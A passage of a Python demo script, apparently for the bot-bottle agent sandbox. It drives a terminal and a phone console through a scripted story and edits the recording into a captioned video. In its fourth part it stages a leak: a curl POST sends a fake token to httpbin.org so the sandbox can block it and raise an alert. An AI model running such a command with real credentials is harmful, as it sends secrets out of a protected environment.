#!/usr/bin/env python3
"""The advanced bot-bottle demo: from the laptop to the phone.

    python3 scripts/demo/advanced.py play --console URL [--record]

It runs on the base demo's environment and phone (`demo.py setup --phone`),
and tells a longer story, with a caption for every beat (LAPTOP_BEATS,
PHONE_BEATS), always on screen:

1. **The laptop.** As in `demo.py play`: the task, the architect's proposal,
   the agent fixing the failing test, the tests passing in the bottle, and a
   host the bottle doesn't allow.
2. **Away.** The phone is on the console's home page, not the agent's. The
   agent asks for the blocked host, the console's push notification for it
   slides in (drawn as the phone would show it: headless Chrome can't show a
   real one; its words are the console's, `bb_console/push.py`), the phone
   taps it, lands on the agent's page and allows the request once.
3. **On the go.** The phone types a follow-up into the agent's message box
   and sends it; the agent takes it and works, and the phone watches.

With `--record`, the video is cut from the terminal's and the phone's
recordings: a title card, the laptop under its captions, the phone beside
its captions, a closing card, crossfading between them, with the waiting cut
out: `~/.cache/bot-bottle-demo/recordings/advanced-<agent>.mp4`. `recut`
draws it again from the last take, for new captions without a new take.
"""

from __future__ import annotations

import argparse
import html
import json
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent))
import demo as base  # noqa: E402  # pylint: disable=wrong-import-position

# A caption for every beat, always on screen: (the mark it starts at, its
# words). Each runs to the next one's mark, crossfading into it; the laptop's
# sit in the band above it, the phone's beside it.
LAPTOP_BEATS = (
    ("start", "Describe the task"),
    ("architect", "Architect suggests a bottle for maximum protection"),
    ("launch", "Boots your agent of choice in a full VM"),
)
PHONE_BEATS = (
    ("away", "Blocked while you're out? Adjust from your phone."),
    ("more", "Same bottle for Claude, Codex, pi, or your own agent, wherever you are."),
    ("leak", "Secret in a request? Blocked, and you're alerted."),
)
# The follow-up's beat: about this long, ending just after it's sent; the
# agent's work on it is cut, to the secret's beat.
FOLLOW_UP_BEAT = 5.0
SENT_SHOWN = 1.0  # seconds of the sent message before the cut
APPROVED_SHOWN = 2.0  # seconds of the agent taking the answer before the cut
ALERT_SECONDS = 3.0  # the open alert, read before the end
MARKS = {mark for mark, _ in LAPTOP_BEATS + PHONE_BEATS} | {"sent", "done"}
SITE = "bot-bottle.com"  # on the closing card
CAPTION_FADE = 0.4
# The opening card: the README's mark, and the site's headline (bot-bottle.com);
# a newline in it breaks the line there.
TAGLINE = "Safe agentic development,\nwhatever the model."
TITLE_SECONDS = 3.0
END_SECONDS = 3.5
NOTIFICATION_SECONDS = 4.0  # the notification, read before it's tapped
HOME_SECONDS = 1.5  # the phone's home page, before the wait for the request is cut
MORE = ('Also add a test that "Crème Brûlée" becomes "creme-brulee", '
        "and make it pass.")
BLOCKED = ("curl -sS https://example.com", r"403|[Bb]locked|not allowed|denied")
FADE = 0.8  # seconds each crossfade takes
TYPING_MS = 45  # per character, on the phone's keyboard


def say(line: str) -> None:
    base.say(line)


class Marks:
    """When each part starts, and the stretches of waiting the cut squeezes,
    all in wall-clock seconds: the terminal's and the phone's recordings each
    line up on them."""

    def __init__(self) -> None:
        self.at: dict[str, float] = {}
        self.tagline = TAGLINE  # the opening card's line
        self.dead: list[tuple[float, float]] = []
        # Waits cut out altogether: nothing on screen is worth keeping.
        self.cut: list[tuple[float, float]] = []
        self._from: float | None = None
        self._cut_from: float | None = None

    def mark(self, name: str) -> None:
        self.at[name] = time.time()

    def dead_from(self) -> None:
        self._from = time.time()

    def dead_to(self) -> None:
        if self._from is not None:
            self.dead.append((self._from, time.time()))
            self._from = None

    def cut_from(self) -> None:
        self._cut_from = time.time()

    def cut_to(self) -> None:
        if self._cut_from is not None:
            self.cut.append((self._cut_from, time.time()))
            self._cut_from = None


def play(args: argparse.Namespace) -> int:
    agent = args.agent
    if not (base.STATE / "agents" / f"{agent}.md").exists():
        raise base.DemoError(f"the demo environment has no {agent} starter: "
                             "run `demo.py setup --phone` first")
    if not base.console_linked():
        raise base.DemoError("the demo environment isn't linked to a console: "
                             "`demo.py setup --phone`")
    if base.session_alive():
        base.tmux("kill-session", "-t", base.SESSION)
    say("stopping the last run's bottled agents")
    base.bb("cleanup", "bots", check=False, capture=True, answer="y\n")
    base.reset_state(agent, args.model)
    base.fake_key()
    base.fresh_project()
    base.write_shim()
    base.trust_project()
    base.warm_architect()
    base.write_shim()
    term = base.Terminal(args.pace)
    term.open()
    say(f"watch it: python3 {Path(base.__file__).relative_to(base.REPO)} watch")
    term.wait(base.PROMPT, 10, "the shell")
    phone = base.Phone(base.console_url(args.console))
    recorder = base.Recorder(f"advanced-{agent}") if args.record else None
    marks = Marks()
    marks.tagline = args.tagline
    video = None
    try:
        if recorder:
            recorder.start(term)
        marks.mark("start")
        _drive(term, phone, agent, args, marks)
        marks.mark("end")
        time.sleep(args.linger)  # the last screen, long enough to read
        return 0
    finally:
        video = phone.stop()
        if recorder:
            _finish(recorder, term, video, phone.started, marks, agent)


def _drive(term: base.Terminal, phone: base.Phone, agent: str, args: argparse.Namespace,
           marks: Marks) -> None:
    # Part 1, the laptop: as demo.py's, up to the blocked host.
    term.run(f"bot-bottle start {agent} --cwd")
    term.wait(base.TASK_READY, 120, "the task step")
    time.sleep(1)
    term.paste(base.TASK)
    time.sleep(1.5)
    term.key("Enter")
    marks.mark("architect")  # its caption shows while the bottle is defined
    marks.dead_from()
    term.wait(base.REVIEW_READY, 300, "the architect's proposal")
    marks.dead_to()
    marks.mark("review")
    time.sleep(args.linger)
    term.key("Enter")
    marks.mark("launch")
    say("launching; the agent takes over the screen")
    marks.dead_from()
    term.wait(base.AGENT_READY.format(agent=agent), 300, "the agent's terminal")
    page = _open_agent(phone, agent)
    term.settle(args.idle, args.agent_timeout, "the agent to finish")
    marks.dead_to()
    marks.mark("check")
    term.shell(base.CHECK)
    text = term.wait(base.TESTS_RAN, 60, "the test run")
    if not re.search(base.TESTS_PASS, text, re.MULTILINE):
        raise base.DemoError(f"the agent stopped with the tests still failing "
                             f"({term.save('final')})")
    say("the tests pass in the bottle")
    time.sleep(args.beat)
    command, expect = BLOCKED
    say("a host the bottle doesn't allow")
    marks.mark("blocked")
    term.shell(command)
    term.wait_new(expect, 90, "the blocked host", command)
    time.sleep(args.beat)

    # Part 2, away: the phone on the home page gets the notification.
    phone.do("home")
    marks.mark("away")
    time.sleep(HOME_SECONDS)
    say(f"the agent asks for {base.ASKED_HOST}; the phone is notified")
    marks.cut_from()
    term.paste(base.ASK)
    time.sleep(1.5)
    term.key("Enter")
    asked = phone.do("wait_approval", agent=page, timeout=180_000)
    marks.cut_to()
    if not asked.get("ok"):
        raise base.DemoError(f"no approval reached the console: {asked.get('error')} "
                             f"(the screen is in {term.save('supervise')})")
    marks.mark("notify")
    shown = phone.do("notify", title=agent, body=notification_body(asked["message"]),
                     open=page, hold=int(NOTIFICATION_SECONDS * 1000))
    if not shown.get("ok"):
        raise base.DemoError(f"the notification didn't show: {shown.get('error')}")
    marks.mark("approve")
    if not phone.approve(base.ASKED_HOST, 60):
        raise base.DemoError("the phone didn't allow the request")
    marks.mark("approved")
    say(f"{base.ASKED_HOST}, allowed from the notification")
    time.sleep(APPROVED_SHOWN)
    marks.cut_from()  # the agent taking the answer
    term.settle(5, 120, "the agent to take the answer")
    marks.cut_to()

    # Part 3: a follow-up typed on the phone.
    marks.mark("more")
    time.sleep(args.beat)
    say("a follow-up, from the phone")
    sent = phone.do("say", text=MORE, delay=TYPING_MS)
    marks.mark("sent")
    if not sent.get("ok"):
        raise base.DemoError(f"the phone couldn't send the follow-up: {sent.get('error')}")
    time.sleep(SENT_SHOWN + 0.5)
    marks.cut_from()  # the agent's work on it
    term.settle(args.idle, args.agent_timeout, "the agent to finish the follow-up")

    # Part 4: a secret sent from the bottle, blocked; its alert on the phone.
    command = f'curl -sS -X POST https://httpbin.org/post -d "token={base.fake_token()}"'
    marks.cut_to()
    marks.mark("leak")
    say("a token sent from the bottle; the phone shows the alert")
    term.shell(command)
    term.wait_new(r"403|[Bb]locked|DLP|refused", 90, "the token's block", command)
    shown = phone.do("alerts", text="secret", timeout=60_000, hold=int(ALERT_SECONDS * 1000))
    if not shown.get("ok"):
        raise base.DemoError(f"the phone saw no alert for the secret: {shown.get('error')}")
    marks.mark("done")
    say(f"done; last screen: {term.save('advanced')}")


def _open_agent(phone: base.Phone, agent: str) -> str:
    """The phone on this run's agent's page; that page's path."""
    rows = base.bb("bots", "--running", capture=True).stdout.splitlines()
    ids = [r.split("\t")[0] for r in rows if r.split("\t")[1:2] == [agent]]
    if not ids:
        raise base.DemoError(f"no running {agent} in `bot-bottle bots`")
    out = phone.do("open_agent", id=ids[0], label=agent)
    if not out.get("ok"):
        raise base.DemoError(f"the phone couldn't open the agent: {out.get('error')}")
    return "/" + out["at"].split("/", 3)[3]


def notification_body(message: str) -> str:
    """What the console's notification says (bb_console/push.py
    `_attention_body`): the card's first line, its session id dropped."""
    first = (message or "").split("\n", 1)[0].strip()
    asks = re.match(r"^\S+ wants (.+)$", first)
    return f"Wants {asks[1]}" if asks else (first or "Wants your approval")


# --- the cut ---------------------------------------------------------------

W, H = base.CANVAS
# The laptop under its caption: VHS's 1240x760 at about 1.02, centred.
CAPTION_BAND = 150
LAPTOP = (330, 190, 1260, 772)
# The phone beside its caption: the phone's 390x844 viewport at 1.17.
PHONE = (1250, 46, 456, 987)
FONT = ('<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600&display=swap"'
        ' rel="stylesheet">')
LAPTOP_FRAME = """<!doctype html><html><head>{font}</head>
<body style="margin:0;background:transparent">
<svg style="position:absolute;left:0;top:0" xmlns="http://www.w3.org/2000/svg" width="{W}" height="{H}">
 <defs><linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
  <stop offset="0" stop-color="#1b1e24"/><stop offset="1" stop-color="#0d0f13"/></linearGradient></defs>
 <path fill="url(#bg)" fill-rule="evenodd" d="M0 0H{W}V{H}H0Z {screen}"/>
 <path fill="#2b2f36" stroke="#4a505a" stroke-width="2" fill-rule="evenodd" d="{lid} {screen}"/>
 <path fill="#3a3f47" stroke="#4a505a" stroke-width="2"
  d="M{bx0} {by0}H{bx1}L{bx2} {by1}Q{bx2} {by2} {bx3} {by2}H{bx4}Q{bx5} {by2} {bx5} {by1}Z"/>
 <rect x="{nx}" y="{by0}" width="180" height="8" rx="4" fill="#23262c"/>
</svg>
</body></html>"""
# The architect's caption, alone, over the laptop's band: it fades in and out.
BAND_CAPTION = """<!doctype html><html><head>{font}</head>
<body style="margin:0;background:transparent">
<div style="position:absolute;left:120px;top:0;width:{cw}px;height:{band}px;display:flex;
 align-items:center;justify-content:center;text-align:center;
 font:600 50px/1.12 Outfit,'Helvetica Neue',Arial,sans-serif;letter-spacing:-0.015em;
 color:#f5efe4;text-wrap:balance">{caption}</div>
</body></html>"""
PHONE_FRAME = """<!doctype html><html><head>{font}</head><body style="margin:0;background:transparent">
<svg style="position:absolute;left:0;top:0" xmlns="http://www.w3.org/2000/svg" width="{W}" height="{H}">
 <defs><linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
  <stop offset="0" stop-color="#1b1e24"/><stop offset="1" stop-color="#0d0f13"/></linearGradient></defs>
 <path fill="url(#bg)" fill-rule="evenodd" d="M0 0H{W}V{H}H0Z {screen}"/>
 <path fill="#16181c" stroke="#4a505a" stroke-width="3" fill-rule="evenodd" d="{body} {screen}"/>
 <rect x="{ix}" y="{iy}" width="116" height="32" rx="16" fill="#000"/>
</svg>
</body></html>"""
# A phone beat's caption, alone, beside the phone: it fades in and out.
SIDE_CAPTION = """<!doctype html><html><head>{font}</head><body style="margin:0;background:transparent">
<div style="position:absolute;left:170px;top:0;width:{cw}px;height:{H}px;display:flex;
 align-items:center;font:600 80px/1.08 Outfit,'Helvetica Neue',Arial,sans-serif;
 letter-spacing:-0.02em;color:#f5efe4;text-wrap:balance">{caption}</div>
</body></html>"""
TITLE_CARD = """<!doctype html><html><head>{font}</head>
<body style="margin:0;width:{W}px;height:{H}px;display:flex;flex-direction:column;
 align-items:center;justify-content:center;gap:28px;
 background:linear-gradient(#1b1e24,#0d0f13);color:#f5efe4;
 font-family:Outfit,'Helvetica Neue',Arial,sans-serif">
<div style="width:200px">{logo}</div>
<div style="font-weight:600;font-size:110px;letter-spacing:-0.035em;line-height:1">bot-bottle</div>
<div style="font-weight:400;font-size:46px;opacity:.78;max-width:1180px;text-align:center;
 line-height:1.25">{tagline}</div>
</body></html>"""
END_CARD = """<!doctype html><html><head>{font}</head>
<body style="margin:0;width:{W}px;height:{H}px;display:flex;flex-direction:column;
 align-items:center;justify-content:center;gap:34px;
 background:linear-gradient(#1b1e24,#0d0f13);color:#f5efe4;
 font-family:Outfit,'Helvetica Neue',Arial,sans-serif">
<div style="width:220px">{logo}</div>
<div style="font-weight:600;font-size:64px;letter-spacing:-0.025em;text-align:center;
 line-height:1.15">{tagline}</div>
<div style="font-weight:600;font-size:52px;color:#2aba88;letter-spacing:-0.01em">{site}</div>
</body></html>"""


def _draw(html: str, name: str) -> Path:
    source, png = base.WORK / f"{name}.html", base.WORK / f"{name}.png"
    source.write_text(html, encoding="utf-8")
    done = subprocess.run(["node", str(base.PHONE_JS), "frame", str(source), str(png),
                           str(W), str(H)], env=base.node_env(), capture_output=True,
                          text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"drawing {name} failed: {done.stderr.strip()[-300:]}")
    return png


def band_caption_png(caption: str, name: str) -> Path:
    size = 50 if len(caption) <= 60 else 40  # a long one takes two lines in the band
    return _draw(BAND_CAPTION.format(font=FONT, caption=html.escape(caption), band=CAPTION_BAND,
                                     cw=W - 240).replace("font:600 50px", f"font:600 {size}px"),
                 f"advanced-caption-{name}")


def side_caption_png(caption: str, name: str) -> Path:
    size = 80 if len(caption) <= 40 else 64 if len(caption) <= 80 else 52
    return _draw(SIDE_CAPTION.format(font=FONT, caption=html.escape(caption), H=H,
                                     cw=PHONE[0] - 170 - 120).replace("font:600 80px",
                                                                      f"font:600 {size}px"),
                 f"advanced-caption-{name}")


def laptop_png() -> Path:
    x, y, w, h = LAPTOP
    by0 = y + h + 30
    return _draw(LAPTOP_FRAME.format(
        font=FONT, W=W, H=H, screen=base._rect(x, y, w, h, 4), lid=base._rect(x - 30, y - 30, w + 60, h + 60, 22),
        bx0=x - 50, by0=by0, bx1=x + w + 50, bx2=x + w + 80, by1=by0 + 22, by2=by0 + 34,
        bx3=x + w + 64, bx4=x - 64, bx5=x - 80, nx=x + w / 2 - 90), "advanced-laptop")


def phone_png() -> Path:
    x, y, w, h = PHONE
    return _draw(PHONE_FRAME.format(
        font=FONT, W=W, H=H, screen=base._rect(x, y, w, h, 46),
        body=base._rect(x - 17, y - 17, w + 34, h + 34, 61), ix=x + w / 2 - 58, iy=y + 13),
        "advanced-phone")


def title_png(tagline: str = TAGLINE) -> Path:
    logo = (base.REPO / "docs" / "bottle-glass.svg").read_text(encoding="utf-8")
    lines = "<br>".join(html.escape(line) for line in tagline.split("\n"))
    return _draw(TITLE_CARD.format(font=FONT, W=W, H=H, logo=logo, tagline=lines),
                 "advanced-title")


def end_png(tagline: str = TAGLINE) -> Path:
    logo = (base.REPO / "docs" / "bottle-glass.svg").read_text(encoding="utf-8")
    lines = "<br>".join(html.escape(line) for line in tagline.split("\n"))
    return _draw(END_CARD.format(font=FONT, W=W, H=H, logo=logo, tagline=lines, site=SITE),
                 "advanced-end")


def _cut(start: float, end: float, dead: list[tuple[float, float]],
         cut: list[tuple[float, float]] = ()) -> str:  # type: ignore[assignment]
    """A filter chain for input 0 from `start` to `end` (its own seconds),
    the `dead` stretches in it squeezed as demo.py's trim does and the `cut`
    ones dropped, each keeping its edges."""
    def inside(spans, kind):  # type: ignore[no-untyped-def]
        return [(max(a, start) + base.MARGIN, min(b, end) - base.MARGIN, kind) for a, b in spans
                if min(b, end) - max(a, start) > 2 * base.MARGIN + 1]
    parts, cursor = [], start
    for a, b, kind in sorted(inside(dead, "squeeze") + inside(cut, "drop")):
        parts += [(cursor, a, ""), (a, b, kind)]
        cursor = b
    parts.append((cursor, end, ""))
    parts = [p for p in parts if p[2] != "drop" and p[1] - p[0] > 0.05]
    chains, labels = [], []
    for i, (a, b, squeeze) in enumerate(parts):
        chain = f"[0:v]fps=30,trim=start={a:.3f}:end={b:.3f},setpts=PTS-STARTPTS"
        if squeeze:
            chain += f",{base.DECIMATE},setpts=N/FRAME_RATE/TB"
        chains.append(f"{chain}[c{i}]")
        labels.append(f"[c{i}]")
    return ";".join(chains) + f";{''.join(labels)}concat=n={len(labels)}:v=1:a=0[cut]"


def _segment(video: Path, start: float, end: float, dead: list[tuple[float, float]],
             screen: tuple[int, int, int, int], frame: Path, out: Path,
             cut: list[tuple[float, float]] = (),  # type: ignore[assignment]
             captions: list[tuple[Path, str]] = ()) -> float:  # type: ignore[assignment]
    """`out`: `video` from `start` to `end` on `screen`, under `frame`, with
    `captions` over it (pictures, each fading "in" or "out" at the start);
    its length in seconds."""
    x, y, w, h = screen
    graph = (_cut(start, end, dead, cut) + f";[cut]scale={w}:{h}:flags=lanczos[s];"
             f"color=c=#0d0f13:s={W}x{H}:r=30[bg];[bg][s]overlay={x}:{y}:shortest=1[a];"
             "[a][1:v]overlay=0:0:shortest=1[f];")
    inputs = ["-i", str(video), "-loop", "1", "-i", str(frame)]
    last = "[f]"
    for i, (picture, way) in enumerate(captions):
        inputs += ["-loop", "1", "-i", str(picture)]
        graph += (f"[{i + 2}:v]format=rgba,fade=t={way}:st=0:d={CAPTION_FADE}:alpha=1[k{i}];"
                  f"{last}[k{i}]overlay=0:0:shortest=1[o{i}];")
        last = f"[o{i}]"
    graph += f"{last}format=yuv420p[v]"
    done = subprocess.run(
        ["ffmpeg", "-y", "-v", "error", *inputs,
         "-filter_complex", graph, "-map", "[v]", "-r", "30", "-c:v", "libx264", "-crf", "20",
         "-preset", "medium", str(out)], capture_output=True, text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"cutting {out.name} failed: {done.stderr.strip()[-400:]}")
    return _length(out)


def _length(video: Path) -> float:
    probe = subprocess.run(["ffprobe", "-v", "error", "-show_entries", "format=duration",
                            "-of", "csv=p=0", str(video)], capture_output=True, text=True, check=True)
    return float(probe.stdout.strip())


# How long a still screen may hold, per part: (any hold, the last one). The
# squeeze keeps a screen where something small still moves (a spinner, a
# timer); these cut what's left. The architect's proposal, the notification
# and the closing screen get longer: they're read.
HOLDS = {"L1": (2.5, 2.5), "L2": (1.0, 1.2), "P0": (1.2, 1.2), "P1": (0.8, 0.8),
         "P2": (0.6, 2.5)}
HOLD = (1.0, 1.0)  # any other beat's
# A caption stays up long enough to read, however quick its beat.
def _reading(words: str) -> float:
    return max(2.2, 1.0 + 0.28 * len(words.split()))
STILL = 0.0003  # freezedetect's noise: under it, a frame counts as unchanged


def _tighten(video: Path, hold: float, last: float) -> None:
    """Cut each still stretch of `video` (in place) down to `hold` seconds,
    the one it ends on to `last`."""
    probe = subprocess.run(
        ["ffmpeg", "-v", "info", "-i", str(video), "-vf",
         f"freezedetect=n={STILL}:d={min(hold, last)}", "-f", "null", "-"],
        capture_output=True, text=True, check=False).stderr
    starts = [float(x) for x in re.findall(r"freeze_start: ([\d.]+)", probe)]
    ends = [float(x) for x in re.findall(r"freeze_end: ([\d.]+)", probe)]
    length = _length(video)
    drop = []
    for i, a in enumerate(starts):
        b = ends[i] if i < len(ends) else length
        keep = last if b >= length - 0.05 else hold
        if b - a > keep + 0.1:
            drop.append((a + keep, b))
    if not drop:
        return
    kept, cursor = [], 0.0
    for a, b in drop:
        kept.append((cursor, a))
        cursor = b
    kept.append((cursor, length))
    kept = [(a, b) for a, b in kept if b - a > 0.04]
    graph = "".join(f"[0:v]trim=start={a:.3f}:end={b:.3f},setpts=PTS-STARTPTS[k{i}];"
                    for i, (a, b) in enumerate(kept))
    graph += "".join(f"[k{i}]" for i in range(len(kept))) + f"concat=n={len(kept)}:v=1:a=0[v]"
    tight = video.with_name(f"{video.stem}.tight.mp4")
    done = subprocess.run(
        ["ffmpeg", "-y", "-v", "error", "-i", str(video), "-filter_complex", graph, "-map", "[v]",
         "-r", "30", "-c:v", "libx264", "-crf", "20", "-preset", "medium", str(tight)],
        capture_output=True, text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"tightening {video.name} failed: {done.stderr.strip()[-300:]}")
    tight.replace(video)


def _beats(video: Path, origin: float, at: dict[str, Any], beats: tuple[Any, ...], last: float, prefix: str,
           frame: Path, screen: tuple[int, int, int, int], caption, parts: Path,  # type: ignore[no-untyped-def]
           dead: list[tuple[float, float]], cut: list[tuple[float, float]]) -> Path:
    """One device's beats, each under its caption (crossfading from the last
    one's), holds cut, joined: `parts`/<prefix>.mp4."""
    pictures = [caption(words, f"{prefix}{i}") for i, (_, words) in enumerate(beats)]
    names = []
    for i, (mark, _) in enumerate(beats):
        start = 0.0 if mark == "start" else at[mark] - origin
        end = at[beats[i + 1][0]] - origin if i + 1 < len(beats) else last
        if mark == "more":  # the follow-up: its last seconds, to just after the send
            start = max(start, _sent(at) + SENT_SHOWN - origin - FOLLOW_UP_BEAT)
        fading = [(pictures[i], "in"), *([(pictures[i - 1], "out")] if i else [])]
        out = parts / f"{prefix}{i}.mp4"
        _segment(video, start, end, dead, screen, frame, out, cut, fading)
        _tighten(out, *HOLDS.get(f"{prefix}{i}", HOLD))
        _at_least(out, _reading(beats[i][1]))
        names.append(out)
    joined = parts / f"{prefix}.mp4"
    _join(names, joined)
    return joined


def _at_least(video: Path, seconds: float) -> None:
    """`video` (in place) held on its last frame until it lasts `seconds`."""
    short = seconds - _length(video)
    if short <= 0.05:
        return
    longer = video.with_name(f"{video.stem}.long.mp4")
    done = subprocess.run(
        ["ffmpeg", "-y", "-v", "error", "-i", str(video), "-vf",
         f"tpad=stop_mode=clone:stop_duration={short:.3f}", "-r", "30", "-c:v", "libx264",
         "-crf", "20", "-preset", "medium", str(longer)], capture_output=True, text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"holding {video.name} failed: {done.stderr.strip()[-300:]}")
    longer.replace(video)


def _join(videos: list[Path], out: Path) -> None:
    """`videos`, one after the other, as `out` (cut as each other is: no fade)."""
    graph = "".join(f"[{i}:v]" for i in range(len(videos))) + f"concat=n={len(videos)}:v=1:a=0[v]"
    done = subprocess.run(
        ["ffmpeg", "-y", "-v", "error", *[a for v in videos for a in ("-i", str(v))],
         "-filter_complex", graph, "-map", "[v]", "-c:v", "libx264", "-crf", "20",
         "-preset", "medium", str(out)], capture_output=True, text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"joining {out.name} failed: {done.stderr.strip()[-300:]}")


def _still(png: Path, seconds: float, out: Path) -> float:
    done = subprocess.run(
        ["ffmpeg", "-y", "-v", "error", "-loop", "1", "-t", f"{seconds:.2f}", "-i", str(png),
         "-r", "30", "-vf", "format=yuv420p", "-c:v", "libx264", "-crf", "20", str(out)],
        capture_output=True, text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"the title card failed: {done.stderr.strip()[-300:]}")
    return _length(out)


def _finish(recorder: base.Recorder, term: base.Terminal, phone_video: Path | None,
            phone_started: float, marks: Marks, agent: str) -> None:
    """Stop filming; then the cut, when every part was reached."""
    if recorder.proc is None:
        return
    subprocess.run(["tmux", "-L", base.SOCKET, "detach-client", "-s", base.SESSION],
                   capture_output=True, check=False)
    recorder.proc.wait(timeout=300)
    if recorder.proc.returncode != 0:
        raise base.DemoError(f"VHS failed; see {base.LOGS / 'vhs.log'}")
    terminal = Path(f"{recorder.out}.mp4")
    say(f"recorded: {terminal}")
    if phone_video is None or not MARKS <= set(marks.at):
        say("no cut: the run didn't reach every part")
        return
    marks_path = base.RECORDINGS / f"advanced-{agent}.marks.json"
    marks_path.write_text(json.dumps({
        "t0": term.t0_wall, "p0": phone_started, "at": marks.at, "dead": marks.dead,
        "cut": marks.cut, "terminal": str(terminal), "phone": str(phone_video),
        "tagline": marks.tagline}), encoding="utf-8")
    _cut_all(agent, json.loads(marks_path.read_text(encoding="utf-8")))


def _cut_all(agent: str, rec: dict[str, Any]) -> None:
    """The advanced cut from what a take recorded (`rec`, its marks file):
    every part drawn again, so new captions or holds need no new take."""
    if not MARKS <= set(rec["at"]):
        raise base.DemoError("this take's marks predate the beats' captions: record a new one")
    terminal, phone_video = Path(rec["terminal"]), Path(rec["phone"])
    t0, p0, at = rec["t0"], rec["p0"], rec["at"]
    pace = _terminal_pace(terminal, rec)
    # Wall-clock marks to each recording's own seconds: the phone's runs in
    # step with the clock, the terminal's a little slow (`pace`).
    def rel(origin, spans=rec["dead"], scale=1.0):  # type: ignore[no-untyped-def]
        return [((a - origin) * scale, (b - origin) * scale) for a, b in spans]
    term_at = {k: t0 + (v - t0) * pace for k, v in at.items()}
    parts = base.RECORDINGS / f"advanced-{agent}-parts"
    parts.mkdir(exist_ok=True)
    tagline = rec.get("tagline") or TAGLINE
    title, closing = parts / "title.mp4", parts / "end.mp4"
    _still(title_png(tagline), TITLE_SECONDS, title)
    laptop = _beats(terminal, t0, term_at, LAPTOP_BEATS, term_at["away"] - t0, "L", laptop_png(),
                    LAPTOP, band_caption_png, parts, rel(t0, scale=pace), [])
    phone = _beats(phone_video, p0, at, PHONE_BEATS, at["done"] + 0.5 - p0, "P", phone_png(), PHONE,
                   side_caption_png, parts, rel(p0), rel(p0, rec["cut"]))
    _still(end_png(tagline), END_SECONDS, closing)
    # Two versions: with the cards, to share on its own; without, for the
    # site, where the page around it says what they would (and it loops).
    _crossfade([title, laptop, phone, closing], base.RECORDINGS / f"advanced-{agent}.mp4")
    _crossfade([laptop, phone], base.RECORDINGS / f"advanced-{agent}-site.mp4")


def _terminal_pace(video: Path, rec: dict[str, Any]) -> float:
    """Seconds of terminal recording per second of wall clock. VHS films a
    little slower than real time (about 3%), so the cut drifts ahead of its
    marks as the take goes on (2s by the check, measured). The screen sits
    still while the agent is done and changes at the check's first
    keystroke: that change, against the check's mark, gives the pace."""
    t0, mark = rec["t0"], rec["at"].get("check")
    if mark is None:
        return 1.0
    m = mark - t0
    start = max(0.0, m - 40)
    probe = subprocess.run(
        ["ffmpeg", "-v", "info", "-ss", f"{start:.2f}", "-t", "50", "-i", str(video), "-vf",
         f"freezedetect=n={STILL}:d=5", "-f", "null", "-"],
        capture_output=True, text=True, check=False).stderr
    ends = [start + float(x) for x in re.findall(r"freeze_end: ([\d.]+)", probe)]
    near = [e for e in ends if m - 6 <= e <= m + 3]
    if not near or m <= 0:
        say("couldn't line the terminal up on the check; its marks are used as they are")
        return 1.0
    return near[0] / m


def _sent(at: dict[str, Any]) -> float:
    """When the follow-up was sent (wall clock)."""
    if "sent" not in at:
        raise base.DemoError("this take has no record of the follow-up being sent: record a new one")
    return at["sent"]


def _crossfade(videos: list[Path], out: Path) -> None:
    """`videos`, each faded into the next, as `out`."""
    lengths = [_length(v) for v in videos]
    chain, offset, last = [], 0.0, "[0:v]"
    for i in range(1, len(lengths)):
        offset += lengths[i - 1] - FADE
        label = "[v]" if i == len(lengths) - 1 else f"[x{i}]"
        chain.append(f"{last}[{i}:v]xfade=transition=fade:duration={FADE}:offset={offset:.3f}"
                     + (",format=yuv420p" if label == "[v]" else "") + label)
        last = label
    graph = ";".join(chain)
    done = subprocess.run(
        ["ffmpeg", "-y", "-v", "error", *[a for v in videos for a in ("-i", str(v))],
         "-filter_complex", graph, "-map", "[v]", "-c:v", "libx264", "-crf", "20",
         "-preset", "medium", str(out)], capture_output=True, text=True, check=False)
    if done.returncode != 0:
        raise base.DemoError(f"joining the parts failed: {done.stderr.strip()[-400:]}")
    say(f"the advanced cut: {out}")


def recut(args: argparse.Namespace) -> int:
    """The last take cut again: captions, title (--tagline) and holds drawn
    afresh from its recordings and marks, without a new take."""
    marks = base.RECORDINGS / f"advanced-{args.agent}.marks.json"
    if not marks.exists():
        raise base.DemoError(f"no marks at {marks}: `play --record` makes them")
    rec = json.loads(marks.read_text(encoding="utf-8"))
    if "phone" not in rec:  # marks from before they named it: the take's own
        videos = sorted((base.WORK / "phone-video").glob("*.webm"), key=lambda p: p.stat().st_size)
        if not videos:
            raise base.DemoError("the take's phone recording is gone")
        rec["phone"] = str(videos[-1])
        rec["terminal"] = str(base.RECORDINGS / f"demo-advanced-{args.agent}.mp4")
    if args.tagline:
        rec["tagline"] = args.tagline
    for key in ("terminal", "phone"):
        if not Path(rec[key]).exists():
            raise base.DemoError(f"the take's {key} recording is gone: {rec[key]}")
    _cut_all(args.agent, rec)
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="advanced.py",
                                     description=(__doc__ or "").split("\n\n", 1)[0])
    sub = parser.add_subparsers(dest="command", required=True)
    p = sub.add_parser("play", help="run the advanced demo")
    p.add_argument("--agent", choices=base.AGENTS, default="claude")
    p.add_argument("--model", default=base.MODEL, help="pi's free OpenRouter model (pi only)")
    p.add_argument("--record", action="store_true",
                   help="film it and cut the video: ~/.cache/bot-bottle-demo/recordings/advanced-<agent>.mp4")
    p.add_argument("--console", help=f"the console's URL (or {base.CONSOLE_ENV})")
    p.add_argument("--tagline", default=TAGLINE, help="the opening card's line")
    p.add_argument("--pace", type=float, default=0.03, help="seconds per typed character")
    p.add_argument("--linger", type=float, default=4.0, help="seconds on a screen worth reading")
    p.add_argument("--beat", type=float, default=2.0, help="seconds between steps")
    p.add_argument("--idle", type=float, default=30.0,
                   help="seconds the agent's screen stays still before it counts as done")
    p.add_argument("--agent-timeout", type=float, default=600.0)
    r = sub.add_parser("recut", help="the last cut again, with another opening line")
    r.add_argument("--agent", choices=base.AGENTS, default="claude")
    r.add_argument("--tagline", help="the opening card's line (\\n breaks it; default: the take's)")
    args = parser.parse_args(argv)
    try:
        return {"play": play, "recut": recut}[args.command](args)
    except base.DemoError as e:
